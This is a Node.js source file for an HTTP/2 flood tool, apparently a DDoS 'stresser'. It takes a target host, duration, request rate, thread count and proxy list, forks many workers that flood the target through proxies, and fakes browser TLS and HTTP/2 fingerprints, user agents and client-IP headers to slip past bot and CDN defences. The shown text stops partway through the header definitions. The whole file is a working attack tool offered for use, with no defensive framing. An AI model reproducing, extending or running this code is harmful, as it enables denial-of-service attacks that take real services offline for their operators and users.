const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3),
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256", 
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_AES_128_CCM_8_SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "DHE-RSA-CHACHA20-POLY1305",
    "DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-SHA384",
    "ECDHE-RSA-AES256-SHA384",
    "ECDHE-ECDSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA256",
    "AES256-GCM-SHA384",
    "AES128-GCM-SHA256",
    "AES256-SHA256",
    "AES128-SHA256",
    "CAMELLIA256-SHA256",
    "CAMELLIA128-SHA256",
    "SEED-SHA",
    "IDEA-CBC-SHA"
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "DHE-RSA-AES256-GCM-SHA384",
  "DHE-RSA-CHACHA20-POLY1305"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512",
          "ed25519",
          "ed448",
          "ecdsa_secp521r1_sha512",
          "dsa_sha256",
          "dsa_sha384",
          "dsa_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448:brainpoolP256r1:brainpoolP384r1:brainpoolP512r1:secp256k1";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
 crypto.constants.SSL_OP_PRIORITIZE_CHACHA |
 crypto.constants.SSL_OP_NO_COMPRESSION;
 if (process.argv.length < 7){console.log(`Usage: node TXORZ-EWE [host] [time] [rps] [thread] [proxyfile]`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200") || response.includes("200 Connection established");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) { 
 console.clear();
    console.log(`@ROBZ`.bgRed);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.red + process.argv[2].white);
    console.log(`Time: `.red + process.argv[3].white);
    console.log(`Rate: `.red + process.argv[4].white);
    console.log(`Thread: `.red + process.argv[5].white);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Merhods By ROBZ Stresser`.brightCyan);
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        //console.log('• Restarting the script', RESTART_DELAY, 'ms...'.white);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            //console.log('• Maximum RAM usage:', ramPercentage.toFixed(2), '%',white);
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "edge", "vivaldi", "samsung"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 250],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        edge: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        vivaldi: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        samsung: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
    chrome: { min: 115, max: 130 },
    safari: { min: 14, max: 18 },
    brave: { min: 115, max: 130 },
    firefox: { min: 99, max: 120 },
    mobile: { min: 85, max: 115 },
    opera: { min: 70, max: 100 },
    operagx: { min: 70, max: 100 },
    edge: { min: 115, max: 125 },
    vivaldi: { min: 115, max: 125 },
    samsung: { min: 85, max: 110 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
    brave: "90.0.4430.212",
    chrome: "90.0.4430.212",
    firefox: "88.0",
    safari: "14.1",
    mobile: "90.0.4430.212",
    opera: "90.0.4430.212",
    operagx: "90.0.4430.212",
    edge: "90.0.4430.212",
    vivaldi: "90.0.4430.212",
    samsung: "90.0.4430.212"
};

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
    chrome: "Win64",
    safari: "macOS",
    brave: "Linux",
    firefox: "Linux",
    mobile: "Android",
    opera: "Linux",
    operagx: "Linux",
    edge: "Windows",
    vivaldi: "Windows",
    samsung: "Android"
};
    const platform = platforms[browser];

    const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(99 + Math.random() * 21)}.0) Gecko/20100101 Firefox/${Math.floor(99 + Math.random() * 21)}.0`,
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 6)}_${Math.floor(0 + Math.random() * 6)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 6)}.0 Safari/605.1.15`,
    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0`,
    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 (Edition GX)`,
    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(1 + Math.random() * 5)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 500)}`,
    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 5)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,
    edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Edg/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0`,
    vivaldi: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Vivaldi/${Math.floor(5 + Math.random() * 5)}.${Math.floor(0 + Math.random() * 10)}`,
    samsung: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 5)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/${Math.floor(15 + Math.random() * 5)}.0 Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`
};
    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
const secChUaMobile = browser === "mobile" ? "?1" : "?0";
const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
const accept = Math.random() < 0.5 
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  : "application/json";
  
const secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"Linux"';
const secChUaFull = Math.random() < 0.5 ? '"Google Chrome";v="118", "Chromium";v="118"' : '"Mozilla Firefox";v="118"';
const secFetchDest = Math.random() < 0.5 ? "document" : "image";
const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
const secFetchSite = Math.random() < 0.5 ? "same-origin" : "cross-site";

const acceptLanguage = Math.random() < 0.5 
  ? "en-US,en;q=0.9" 
  : Math.random() < 0.5 
  ? "en-GB,en;q=0.9" 
  : "es-ES,es;q=0.8,en;q=0.7";

const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";

const connection = Math.random() < 0.5 ? "keep-alive" : "close";

const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";

const referer = Math.random() < 0.5 
  ? "https://www.google.com" 
  : "https://www.bing.com";
  
const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

const te = Math.random() < 0.5 ? "trailers" : "gzip";

const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";
// Path acak yang lebih bervariasi
function getRandomPath() {
    const paths = [
        "/about", 
        "/products", 
        "/contact", 
        "/news", 
        "/services", 
        "/blog/post-" + Math.floor(Math.random() * 1000), 
        "/article/" + Math.floor(Math.random() * 1000),
        "/category/" + Math.floor(Math.random() * 10),
        "/shop/product-" + Math.floor(Math.random() * 500),
        "/portfolio", 
        "/faq", 
        "/support", 
        "/store/item-" + Math.floor(Math.random() * 1000),
        "/events/" + Math.floor(Math.random() * 200)
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}
    const headersMap = {
    brave: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 25),
        "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 15)}", "Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 15)}.0.0.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0",
        "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "x-client-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },
    chrome: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 25),
        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0",
        "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "x-client-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "true-client-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },
    firefox: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 25),
        "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 50)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 50)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 50)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0",
        "x-real-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cf-connecting-ip": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    },
    mobile: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 25),
        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 15)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 6)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 60)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 50)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
